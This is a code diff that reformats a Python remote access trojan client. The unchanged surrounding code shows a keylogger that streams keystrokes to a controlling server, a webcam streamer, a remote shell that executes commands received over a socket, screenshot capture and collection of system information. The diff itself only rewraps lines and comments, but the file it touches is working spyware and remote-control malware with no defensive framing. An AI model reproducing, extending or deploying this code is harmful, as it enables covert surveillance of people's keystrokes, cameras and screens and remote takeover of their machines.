@@ -16,6 +16,7 @@ from config import *
 
 global keylogging_active, wstreamer_active
 
+
 def keylogging_thread(client_socket):
     def on_key_event(event):
         if event.event_type == keyboard.KEY_DOWN:
@@ -36,7 +37,8 @@ def wstreamer_thread(client_socket):
     cam_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     cam_socket.connect((CLIENT_IP, CAM_CLIENT_PORT))
 
-    client_socket.send(("Cam-Client spawned with Client PID : " + str(os.getpid())).encode('utf-8'))
+    client_socket.send(
+        ("Cam-Client spawned with Client PID : " + str(os.getpid())).encode('utf-8'))
 
     cam = cv2.VideoCapture(0)
     img_counter = 0
@@ -65,7 +67,8 @@ def wstreamer_thread(client_socket):
 
         end_time = time.time()  # Record the end time
         processing_time = end_time - start_time
-        sleep_time = max(0, delay - processing_time)  # Calculate remaining sleep time
+        # Calculate remaining sleep time
+        sleep_time = max(0, delay - processing_time)
         time.sleep(sleep_time)
 
         if cv2.waitKey(1) & 0xFF == ord('q'):
@@ -73,14 +76,12 @@ def wstreamer_thread(client_socket):
 
     cam.release()
     cam_socket.close()
-    
-
-
 
 
 def shell_worker(client_socket):
     while True:
-        client_socket.send("#INSHELLMODE Enter shell command (or Send 'perform stop' to stop): ".encode('utf-8'))
+        client_socket.send(
+            "#INSHELLMODE Enter shell command (or Send 'perform stop' to stop): ".encode('utf-8'))
         command = client_socket.recv(1024).decode('utf-8')
 
         if command == 'perform stop':
@@ -95,14 +96,16 @@ def screen_shot(client_socket):
         screenshot = sct.shot()  # Capture a screenshot
         # Compress and pickle the frame
         encoded_frame = pickle.dumps(screenshot)
-        compressed_frame = zlib.compress(encoded_frame, level=zlib.Z_BEST_COMPRESSION)
+        compressed_frame = zlib.compress(
+            encoded_frame, level=zlib.Z_BEST_COMPRESSION)
         # Send the frame to the server
         client_socket.sendall(compressed_frame)
 
 
 def execute_shell_command(command):
     try:
-        result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
+        result = subprocess.check_output(
+            command, shell=True, stderr=subprocess.STDOUT)
         return result.decode('utf-8')
     except subprocess.CalledProcessError as e:
         return str(e.output.decode('utf-8'))
@@ -114,7 +117,11 @@ def perform_task(task_name, client_socket):
     if task_name == 'hello':
         return "Task: Hello, Server!"
     elif task_name == 'show_os_info':
-        os_info = f"OS: {platform.system()} {platform.release()} Build: {platform.version()} {platform.architecture()}"
+        os_info = f"OS: {
+            platform.system()} {
+            platform.release()} Build: {
+            platform.version()} {
+                platform.architecture()}"
         return os_info
     elif task_name == 'show_hw_info':
         hw_info = ""
@@ -147,7 +154,9 @@ def perform_task(task_name, client_socket):
         # Net Info
         hw_info += "[Net Info]\n"
         hw_info += f"Hostname: {socket.gethostname()}\n"
-        hw_info += f"IP Address: {socket.gethostbyname(socket.gethostname())}\n\n"
+        hw_info += f"IP Address: {
+            socket.gethostbyname(
+                socket.gethostname())}\n\n"
 
         # Battery Info (if applicable)
         if hasattr(psutil, "sensors_battery"):
@@ -155,26 +164,32 @@ def perform_task(task_name, client_socket):
             if battery:
                 hw_info += "[Battery Info]\n"
                 hw_info += f"Percentage: {battery.percent}%\n"
-                hw_info += f"Plugged In: {'Yes' if battery.power_plugged else 'No'}\n\n"
+                hw_info += f"Plugged In: {
+                    'Yes' if battery.power_plugged else 'No'}\n\n"
         return hw_info
     elif task_name == 'kstreamer':
         keylogging_active = True
-        keylogging_thread_obj = threading.Thread(target=keylogging_thread, args=(client_socket,))
+        keylogging_thread_obj = threading.Thread(
+            target=keylogging_thread, args=(client_socket,))
         keylogging_thread_obj.start()
         return "Keylogging started."
     elif task_name == 'wstreamer':
         wstreamer_active = True
-        wstreamer_thread_obj = threading.Thread(target=wstreamer_thread, args=(client_socket,))
+        wstreamer_thread_obj = threading.Thread(
+            target=wstreamer_thread, args=(client_socket,))
         wstreamer_thread_obj.start()
         return "Wstreamer started.\nPlease wait for minimum 10 seconds for stream propagation."
     elif task_name == 'sheller':
-        shell_thread = threading.Thread(target=shell_worker, args=(client_socket,))
+        shell_thread = threading.Thread(
+            target=shell_worker, args=(
+                client_socket,))
         shell_thread.start()
         shell_thread.join()
         return "Shell session ended."
     elif task_name == 'screener':
         client_socket.send("Sharing Screenshot...\n".encode('utf-8'))
-        screen_share_thread = threading.Thread(target=screen_shot, args=(client_socket,))
+        screen_share_thread = threading.Thread(
+            target=screen_shot, args=(client_socket,))
         screen_share_thread.start()
         screen_share_thread.join()
         return "Screenshot sent to server"
@@ -200,7 +215,8 @@ def connect_to_server():
 
 
 def main():
-    global keylogging_active, wstreamer_active # Define  global flags for keylogging and webcam stream state
+    # Define  global flags for keylogging and webcam stream state
+    global keylogging_active, wstreamer_active
     keylogging_active = False
     # global wstreamer_active  # Define a global flag for keylogging state
     wstreamer_active = False
